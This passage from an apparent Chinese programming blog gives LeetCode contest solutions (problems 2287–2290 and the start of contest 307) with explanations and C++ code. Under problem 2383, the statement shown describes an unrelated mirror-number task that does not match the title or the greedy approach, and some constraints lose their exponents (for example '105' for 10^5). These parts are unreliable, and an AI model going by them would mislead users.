<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;ilovecodingonleetcode&quot;, target = &quot;code&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">对于 &quot;code&quot; 的第 1 个副本，选取下标为 4 、5 、6 和 7 的字符。</span><br><span class="line">对于 &quot;code&quot; 的第 2 个副本，选取下标为 17 、18 、19 和 20 的字符。</span><br><span class="line">形成的字符串分别是 &quot;ecod&quot; 和 &quot;code&quot; ，都可以重排为 &quot;code&quot; 。</span><br><span class="line">可以形成最多 2 个 &quot;code&quot; 的副本，所以返回 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcba&quot;, target = &quot;abc&quot;</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">选取下标为 0 、1 和 2 的字符，可以形成 &quot;abc&quot; 的 1 个副本。 </span><br><span class="line">可以形成最多 1 个 &quot;abc&quot; 的副本，所以返回 1 。</span><br><span class="line">注意，尽管下标 3 和 4 分别有额外的 &#x27;a&#x27; 和 &#x27;b&#x27; ，但不能重用下标 2 处的 &#x27;c&#x27; ，所以无法形成 &quot;abc&quot; 的第 2 个副本。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abbaccaddaeea&quot;, target = &quot;aaaaa&quot;</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">选取下标为 0 、3 、6 、9 和 12 的字符，可以形成 &quot;aaaaa&quot; 的 1 个副本。</span><br><span class="line">可以形成最多 1 个 &quot;aaaaa&quot; 的副本，所以返回 1 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 100</code></li>
<li><code>1 &lt;= target.length &lt;= 10</code></li>
<li><code>s</code> 和 <code>target</code> 由小写英文字母组成</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/rearrange-characters-to-make-target-string/">https://leetcode.cn/problems/rearrange-characters-to-make-target-string/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历即可
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计即可，每次从字符串 $s$ 中减去 $target$ 覆盖的字符即可，统计可以减去的次数即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n + m)$, 其中 $n,m$ 分别为两个字符串的长度。</li>
<li>空间复杂度：$O(\Sigma)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rearrangeCharacters</span><span class="params">(string s, string target)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt1</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt2</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : target) &#123;</span><br><span class="line">            cnt1[c - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c: s) &#123;</span><br><span class="line">            cnt2[c - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">bool</span> valid = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt2[i] &gt;= cnt1[i]) &#123;</span><br><span class="line">                    cnt2[i] -= cnt1[i];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    valid = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (valid)&#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2288-价格减免"><a href="#2288-价格减免" class="headerlink" title="2288. 价格减免"></a>2288. 价格减免</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>句子 是由若干个单词组成的字符串，单词之间用单个空格分隔，其中每个单词可以包含数字、小写字母、和美元符号 ‘$’ 。如果单词的形式为美元符号后跟着一个非负实数，那么这个单词就表示一个价格。</p>
<p>例如<code> &quot;$100&quot;、&quot;$23&quot;</code> 和 <code>&quot;$6.75&quot; </code>表示价格，而 <code>&quot;100&quot;、&quot;$&quot; </code>和<code> &quot;2$3&quot;</code> 不是。<br>注意：本题输入中的价格均为整数。</p>
<p>给你一个字符串 <code>sentence</code>  和一个整数 <code>discount</code> 。对于每个表示价格的单词，都在价格的基础上减免 <code>discount%</code> ，并 更新 该单词到句子中。所有更新后的价格应该表示为一个 恰好保留小数点后两位 的数字。</p>
<p>返回表示修改后句子的字符串。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：sentence = &quot;there are $1 $2 and 5$ candies in the shop&quot;, discount = 50</span><br><span class="line">输出：&quot;there are $0.50 $1.00 and 5$ candies in the shop&quot;</span><br><span class="line">解释：</span><br><span class="line">表示价格的单词是 &quot;$1&quot; 和 &quot;$2&quot; 。 </span><br><span class="line">- &quot;$1&quot; 减免 50% 为 &quot;$0.50&quot; ，所以 &quot;$1&quot; 替换为 &quot;$0.50&quot; 。</span><br><span class="line">- &quot;$2&quot; 减免 50% 为 &quot;$1&quot; ，所以 &quot;$1&quot; 替换为 &quot;$1.00&quot; 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：sentence = &quot;1 2 $3 4 $5 $6 7 8$ $9 $10$&quot;, discount = 100</span><br><span class="line">输出：&quot;1 2 $0.00 4 $0.00 $0.00 7 8$ $0.00 $10$&quot;</span><br><span class="line">解释：</span><br><span class="line">任何价格减免 100% 都会得到 0 。</span><br><span class="line">表示价格的单词分别是 &quot;$3&quot;、&quot;$5&quot;、&quot;$6&quot; 和 &quot;$9&quot;。</span><br><span class="line">每个单词都替换为 &quot;$0.00&quot;。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= sentence.length &lt;= 105</code></li>
<li><code>sentence</code> 由小写英文字母、数字、’ ‘ 和 ‘$’ 组成</li>
<li><code>sentence</code> 不含前导和尾随空格</li>
<li><code>sentence</code> 的所有单词都用单个空格分隔</li>
<li>所有价格都是 正 整数且不含前导零</li>
<li>所有价格 最多 为  <code>10</code> 位数字</li>
<li><code>0 &lt;= discount &lt;= 100</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/apply-discount-to-prices">https://leetcode.cn/problems/apply-discount-to-prices</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>字符串变换
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>分出所有的单词，然后将其中的价格按照题意进行变换即可，不过 <code>C++</code> 写起来稍微复杂一些，可以用 $\texttt{sprintf, stringstream, setprecision }$ 等库函数实现，确实没啥好说的。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 为字符串的长度。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">split</span><span class="params">(string sentence)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        <span class="type">int</span> n = sentence.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (pos &lt; n) &#123;</span><br><span class="line">            <span class="keyword">while</span>(pos &lt; n &amp;&amp; sentence[pos] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> curr = pos;</span><br><span class="line">            <span class="keyword">while</span>(pos &lt; n &amp;&amp; sentence[pos] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curr &lt; n) &#123;</span><br><span class="line">                res.<span class="built_in">emplace_back</span>(sentence.<span class="built_in">substr</span>(curr, pos - curr));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkvalid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>] != <span class="string">&#x27;$&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">isdigit</span>(s[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">string <span class="title">discountPrices</span><span class="params">(string sentence, <span class="type">int</span> discount)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; words = <span class="built_in">split</span>(sentence);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; words.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">checkvalid</span>(words[i]))&#123;</span><br><span class="line">                string curr;</span><br><span class="line">                curr.<span class="built_in">push_back</span>(<span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; words[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                    num = num * <span class="number">10</span> + words[i][j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                num = num * (<span class="number">100</span> - discount);</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> prefix = num / <span class="number">100</span>;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> suffix = num % <span class="number">100</span>;</span><br><span class="line">                curr.<span class="built_in">append</span>(<span class="built_in">to_string</span>(prefix) + <span class="string">&quot;.&quot;</span> + (suffix &lt; <span class="number">10</span> ? (<span class="string">&quot;0&quot;</span> + <span class="built_in">to_string</span>(suffix)) : (<span class="built_in">to_string</span>(suffix))));</span><br><span class="line">                words[i] = curr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        string res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; words.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            res.<span class="built_in">append</span>(words[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">append</span>(words.<span class="built_in">back</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2289-使数组按非递减顺序排列"><a href="#2289-使数组按非递减顺序排列" class="headerlink" title="2289. 使数组按非递减顺序排列"></a>2289. 使数组按非递减顺序排列</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的整数数组 <code>nums</code> 。在一步操作中，移除所有满足 <code>nums[i - 1] &gt; nums[i] 的 nums[i]</code> ，其中 <code>0 &lt; i &lt; nums.length</code> 。</p>
<p>重复执行步骤，直到 <code>nums</code> 变为 非递减 数组，返回所需执行的操作数。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [5,3,4,4,7,3,6,11,8,5,11]</span><br><span class="line">输出：3</span><br><span class="line">解释：执行下述几个步骤：</span><br><span class="line">- 步骤 1 ：[5,3,4,4,7,3,6,11,8,5,11] 变为 [5,4,4,7,6,11,11]</span><br><span class="line">- 步骤 2 ：[5,4,4,7,6,11,11] 变为 [5,4,7,11,11]</span><br><span class="line">- 步骤 3 ：[5,4,7,11,11] 变为 [5,7,11,11]</span><br><span class="line">[5,7,11,11] 是一个非递减数组，因此，返回 3 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,5,7,7,13]</span><br><span class="line">输出：0</span><br><span class="line">解释：nums 已经是一个非递减数组，因此，返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/steps-to-make-array-non-decreasing">https://leetcode.cn/problems/steps-to-make-array-non-decreasing</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>参考<a href="https://leetcode.cn/problems/steps-to-make-array-non-decreasing/solution/by-endlesscheng-s2yc/">单调栈</a>的做法，当时确实没有想到更好的解法, 确实比较难的解法，但是线段树真心是各种无敌，掌握了线段树，可以掌握一大波各种复杂问题的处理。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 为数组的长度。。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">totalSteps</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        stack&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">int</span> maxT = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (!st.<span class="built_in">empty</span>() &amp;&amp; st.<span class="built_in">top</span>().first &lt;= num) &#123;</span><br><span class="line">                maxT = <span class="built_in">max</span>(maxT, st.<span class="built_in">top</span>().second);</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            maxT = st.<span class="built_in">empty</span>() ? <span class="number">0</span> : maxT + <span class="number">1</span>;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, maxT);</span><br><span class="line">            st.<span class="built_in">emplace</span>(num, maxT);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2290-到达角落需要移除障碍物的最小数目"><a href="#2290-到达角落需要移除障碍物的最小数目" class="headerlink" title="2290. 到达角落需要移除障碍物的最小数目"></a>2290. 到达角落需要移除障碍物的最小数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的二维整数数组<code> grid</code> ，数组大小为 <code>m x n </code>。每个单元格都是两个值之一：</p>
<ul>
<li><code>0</code> 表示一个 空 单元格，</li>
<li><code>1</code> 表示一个可以移除的 障碍物 。<br>你可以向上、下、左、右移动，从一个空单元格移动到另一个空单元格。</li>
</ul>
<p>现在你需要从左上角 <code>(0, 0)</code> 移动到右下角 <code>(m - 1, n - 1)</code> ，返回需要移除的障碍物的 最小 数目。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[0,1,1],[1,1,0],[1,1,0]]</span><br><span class="line">输出：2</span><br><span class="line">解释：可以移除位于 (0, 1) 和 (0, 2) 的障碍物来创建从 (0, 0) 到 (2, 2) 的路径。</span><br><span class="line">可以证明我们至少需要移除两个障碍物，所以返回 2 。</span><br><span class="line">注意，可能存在其他方式来移除 2 个障碍物，创建出可行的路径。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[0,1,0,0,0],[0,1,0,1,0],[0,0,0,1,0]]</span><br><span class="line">输出：0</span><br><span class="line">解释：不移除任何障碍物就能从 (0, 0) 到 (2, 4) ，所以返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 105</code></li>
<li><code>2 &lt;= m * n &lt;= 105</code></li>
<li><code>grid[i][j]</code> 为 <code>0</code> 或 <code>1</code></li>
<li><code>grid[0][0] == grid[m - 1][n - 1] == 0</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-obstacle-removal-to-reach-corner">https://leetcode.cn/problems/minimum-obstacle-removal-to-reach-corner</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>BFS 或者 dijkstra
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉这个题目只能算是简单题目，感觉没什么好说的，标准的模板题目。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times n)$, 其中 $m, n$ 为矩阵的行数与列数。</li>
<li>空间复杂度：$O(m \times n)$, 其中 $m, n$ 为矩阵的行数与列数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>dijkstra<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumObstacles</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = INT_MAX;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">cost</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, m * n));</span><br><span class="line">        <span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* dijistra */</span></span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">        pq.<span class="built_in">emplace</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        cost[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!pq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [c, p] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="type">int</span> x = p / n;</span><br><span class="line">            <span class="type">int</span> y = p % n;</span><br><span class="line">            <span class="keyword">if</span>(x == m - <span class="number">1</span> &amp;&amp; y == n - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">                <span class="type">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (grid[x][y] + c &lt; cost[nx][ny]) &#123;</span><br><span class="line">                        pq.<span class="built_in">emplace</span>(grid[x][y] + c, nx * n + ny);</span><br><span class="line">                        cost[nx][ny] = grid[x][y] + c;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cost[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>BFS<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumObstacles</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">cost</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, INT_MAX));</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; qu;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        cost[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">-1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">while</span>(!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [x, y] = qu.<span class="built_in">front</span>();</span><br><span class="line">            qu.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">                <span class="type">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (cost[x][y] + grid[nx][ny] &lt; cost[nx][ny]) &#123;</span><br><span class="line">                        qu.<span class="built_in">emplace</span>(nx, ny);</span><br><span class="line">                        cost[nx][ny] = cost[x][y] + grid[nx][ny];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cost[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  weekly contest 307</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/28/</url>
    <content><![CDATA[<h2 id="leetcode-weekly-contest-307"><a href="#leetcode-weekly-contest-307" class="headerlink" title="leetcode  weekly contest 307"></a>leetcode  weekly contest 307</h2><p>周赛题目质量确实挺高的，最后一题还是不会。</p>
<h4 id="2383-赢得比赛需要的最少训练时长"><a href="#2383-赢得比赛需要的最少训练时长" class="headerlink" title="2383. 赢得比赛需要的最少训练时长"></a>2383. 赢得比赛需要的最少训练时长</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>校运动会上，所有参赛同学身上都贴有他的参赛号码。某班参赛同学的号码记于数组 <code>nums</code> 中。假定反转后的号码称为原数字的「镜像号码」。如果 <strong>两位同学</strong> 满足条件：镜像号码 A + 原号码 B &#x3D; 镜像号码 B + 原号码 A，则这两位同学可以到广播站兑换一次读通讯稿的机会，为同班同学加油助威。请返回所有参赛同学可以组成的可以读通讯稿的组数，并将结果对<code>10^9+7</code>取余。</p>
<p>注意：</p>
<ol>
<li>镜像号码中如存在前置零，则忽略前置零。</li>
<li>同一位同学可有多次兑换机会。</li>
</ol>
<p><strong>示例 1：</strong></p>
<blockquote>
<p>输入：<code>nums = [17,28,39,71]</code></p>
<p>输出：<code>3</code></p>
<p>解释：<br>共有三对同学，分别为 [17,28]、[17,39]、[28,39]。其中：<br>第一对同学：17 + 82 &#x3D; 71 + 28；<br>第二对同学：17 + 93 &#x3D; 71 + 39；<br>第三对同学：28 + 93 &#x3D; 82 + 39。</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<code>nums = [71, 60]</code></p>
<p>输出：<code>1</code></p>
<p>解释：<br>共有一对同学，为 [71, 60]。<br>因为 71 + 6 &#x3D; 17 + 60，此处 60 的镜像号码为 6，前导零被忽略。</p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= nums.length &lt;= 10^6</code></li>
<li><code>0 &lt;= nums[i] &lt;= 10^9</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-hours-of-training-to-win-a-competition/">https://leetcode.cn/problems/minimum-hours-of-training-to-win-a-competition/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的贪心算法，每次遇到不足时，则进行增加刚好比当前的元素的能量和经验大 $1$ 即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
